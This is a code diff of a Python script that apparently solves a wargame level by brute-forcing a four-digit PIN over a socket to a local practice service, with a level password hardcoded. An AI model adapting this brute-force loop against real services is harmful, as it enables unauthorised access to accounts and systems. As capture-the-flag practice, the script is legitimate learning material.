@@ -6,23 +6,29 @@ class BF():
       self.client = socket.socket()
       self.client.connect((address, port))
       self.pw = password
-      self.bufSize = 4096
+      self.bufSize = 1024
 
-   def try_pin(self, pin)
-      self.client.sendall("{} {}".format(self.password, pin).encode())
-      data = self.client.recv(bufSize)
+      welcome = self.client.recv(self.bufSize)
+      print(welcome)
+
+   def try_pin(self, pin):
+      code = "{} {}\n".format(self.pw, pin)
+      self.client.sendall(code.encode())
+      data = self.client.recv(self.bufSize)
       data = data.decode()
 
       return 'Wrong!' not in data
 
 def main():
-   client = BF()
+   client = BF('localhost',30002,'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ')
 
-   for pin in range(1,9999):
-      result = BF.try_pin(pin)
+   for pin in range(1,10000):
+      result = client.try_pin(str(pin).zfill(4))
       if result:
          print('The pin is {}'.format(pin))
          quit()
+      else:
+         print('Wrong PIN: {}'.format(str(pin).zfill(4)))
 
 if __name__ == '__main__':
    main()
